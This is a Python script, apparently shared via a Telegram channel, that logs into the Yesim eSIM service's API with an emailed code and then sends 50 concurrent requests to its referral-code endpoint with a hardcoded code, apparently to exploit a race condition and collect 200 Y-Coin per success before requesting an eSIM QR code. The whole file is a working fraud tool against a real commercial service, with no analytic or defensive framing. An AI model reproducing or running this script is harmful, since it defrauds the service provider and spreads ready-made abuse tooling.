import requests
import threading
import queue

M = "\033[34m"
Y = "\033[32m"
R = "\033[31m"

print(M+"  _____             _      ______                "+M)
print(M+" |  __ \           | |    |  ____|               "+M)
print(M+" | |  | | __ _ _ __| | __ | |__   _ __  ______ _ "+M)
print(M+" | |  | |/ _` | '__| |/ / |  __| | '_ \|_  / _` |"+M)
print(M+" | |__| | (_| | |  |   <  | |____| | | |/ / (_| |"+M)
print(M+" |_____/ \__,_|_|  |_|\_\ |______|_| |_/_/ \__,_|"+M)
print(R+"                         Code By -> TG: dark_enza"+R)
print("")
print(Y+" Yesim Y-Coin Creator"+Y)
print(R+" Telegram Kanalım : @dwstoree"+R)
print("")
eposta = input(M+"Eposta gir: "+M)

# -------------------- Kod GÖnderme --------------------#
url1 = "https://iweb.yesim.app//v1/auth_email?email=" + eposta + "&version=4.0.8&lang=en&platform=3"
headers1 = {
    'Host': 'iweb.yesim.app'
}
res1 = requests.post(url1, headers=headers1)
sonuc1 = res1.json()

# ------------------- Kod Onaylama session id çekme ---------------#
kod = input("Kodu Gir: ")
url2 = "https://iweb.yesim.app/v1/auth_code?code=" + kod + "&email=" + eposta + "&version=4.0.8&lang=en&platform=3"
headers2 = {
    'Host': 'iweb.yesim.app'
}
res2 = requests.post(url2, headers=headers2)
sonuc2 = res2.json()["sessionId"]

# ------------- Y Coin Çekme -----------#
url3 = "https://iweb.yesim.app/v1/code_apply?ref_code&web_key=" + sonuc2 + "&ref_code=UMVM790&lang=en"
headers3 = {
    'Host': 'iweb.yesim.app'
}

def make_request(url, headers):
    res = requests.get(url, headers=headers)
    return res.json()

count = 50 
sira = queue.Queue()
for i in range(count):
    sira.put((url3, headers3))

toplam_y_coin = 0

def basla(sira):
    global toplam_y_coin
    while not sira.empty():
        url, headers = sira.get()
        try:
            res = make_request(url, headers)
            if res == ['success']:
                toplam_y_coin += 200
                print(Y+"+200 Y-Coin Eklendi/Added"+Y)
                print("")
                print("---" * 10)
            sira.task_done()
        except Exception as e:
            print(R+"İstek başarısız oldu:"+R, str(e))

for i in range(count):
    t = threading.Thread(target=basla, args=(sira,))
    t.start()

sira.join()
print("Toplam Alınan Y-Coin:", toplam_y_coin)
# -------------- Esim Almak ------------#

try:
    dark = requests.get("https://iweb.yesim.app/v1/activate_pay_as_you_go?web_key="+sonuc2+"&lang=en", timeout=5)
    sonuc4 = dark.json() == "OK"
    print(Y+"KareKod İstendi"+Y)
except requests.exceptions.Timeout:
    print(R+"KareKod Oluşturulamadı."+R)
    raise SystemExit()

print("")

try:
    dark1 = requests.get("https://iweb.yesim.app/v1/show_my_qrs?web_key=" + sonuc2 + "&lang=en", timeout=5)
    sonuc5 = dark1.json()["Qrs"]
    print(Y+"KareKod Epostaya Gönderildi"+Y)
except:
    print(R+"KareKod Oluşturulamadı"+R)
    raise SystemExit()

